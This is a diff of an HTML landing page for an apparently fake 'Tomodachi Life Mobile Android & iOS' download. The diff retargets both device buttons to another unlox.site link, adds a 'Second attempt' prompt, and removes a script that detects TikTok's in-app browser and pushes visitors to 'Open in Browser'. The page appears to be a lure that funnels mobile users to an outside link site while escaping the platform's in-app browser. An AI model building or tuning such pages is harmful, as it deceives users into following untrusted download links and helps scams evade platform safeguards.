@@ -388,24 +388,6 @@
         .popup-close:hover {
             color: #999;
         }
-
-        #tiktok-fallback {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #000000;
-            z-index: 9999;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            text-align: center;
-            padding: 20px;
-            padding-top: 50px;
-            box-sizing: border-box;
-        }
     </style>
 </head>
 
@@ -425,7 +407,7 @@
     <div class="cards-container">
 
         <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/gLwbX3Pd/tomodachi.avif" alt="banner">
+            <img class="banner" src="https://i.ytimg.com/vi/0Fghz93zCdY/maxresdefault.jpg" alt="banner">
             <div class="game-info-box">
                 <div class="game-info">
                     <h3>Tomodachi Life Mobile Android & iOS</h3>
@@ -452,11 +434,11 @@
         <div class="popup-box">
             <div class="popup-icon">🎮</div>
             <h3>SELECT YOUR DEVICE</h3>
-            <p>Choose your platform to start downloading</p>
+            <p>Second attempt<br> Choose your platform to start downloading</p>
 
             <div class="device-btns">
 
-                <a class="device-btn android" href="https://unlox.site/tomodachi">
+                <a class="device-btn android" href="https://unlox.site/last">
                     <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path
                             d="M17.523 15.341a1 1 0 1 1-2 0 1 1 0 0 1 2 0zm-9.046 0a1 1 0 1 1-2 0 1 1 0 0 1 2 0zM3.18 8.5h17.64C21.47 8.5 22 9.03 22 9.68v6.44c0 .65-.53 1.18-1.18 1.18h-.82v3.2a1.5 1.5 0 0 1-3 0V17.3H7v3.2a1.5 1.5 0 0 1-3 0V17.3h-.82C2.53 17.3 2 16.77 2 16.12V9.68C2 9.03 2.53 8.5 3.18 8.5zM15.5 3.24l1.34-2.07a.3.3 0 0 0-.5-.32l-1.37 2.1A7.47 7.47 0 0 0 12 2.5c-.88 0-1.71.17-2.47.45L8.16.83a.3.3 0 0 0-.5.32l1.34 2.07A7.5 7.5 0 0 0 4.5 8.5h15A7.5 7.5 0 0 0 15.5 3.24z"
@@ -472,7 +454,7 @@
                     <span class="btn-label">ANDROID</span>
                 </a>
 
-                <a class="device-btn ios" href="https://unlox.site/tomodachi">
+                <a class="device-btn ios" href="https://unlox.site/last">
                     <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path
                             d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.37 2.83zM13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"
@@ -492,14 +474,6 @@
         </div>
     </div>
 
-    <div id="tiktok-fallback">
-        <img src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="Instruction GIF"
-            style="max-width: 100%; height: auto; max-height: 70vh; margin-bottom: 15px; border-radius: 8px;" />
-        <p style="font-family: sans-serif; font-size: 18px; color: #ffffff; margin: 0;">
-            🚀 For protection and safety, please <b>Open in Browser</b>.
-        </p>
-    </div>
-
     <script>
         function openDevicePicker() {
             document.getElementById('popup-overlay').style.display = 'flex';
@@ -514,26 +488,6 @@
         document.getElementById('popup-overlay').addEventListener('click', function (e) {
             if (e.target === this) closePopup();
         });
-    </script>
-
-    <script>
-        (function () {
-            const ua = navigator.userAgent.toLowerCase();
-            const ref = document.referrer.toLowerCase();
-            const fb = document.getElementById('tiktok-fallback');
-            if (!fb) return;
-
-            const tikTokIdentifiers = ["tiktok", "musical_ly", "com.ss.android.ugc.trill", "musicallygo"];
-            const isTikTokBrowser = tikTokIdentifiers.some(id => ua.includes(id)) || ref.includes("tiktok");
-
-            if (isTikTokBrowser) {
-                fb.style.display = 'flex';
-                document.body.style.overflow = 'hidden';
-            } else {
-                fb.style.display = 'none';
-                document.body.style.overflow = 'auto';
-            }
-        })();
     </script>
 
     <script>
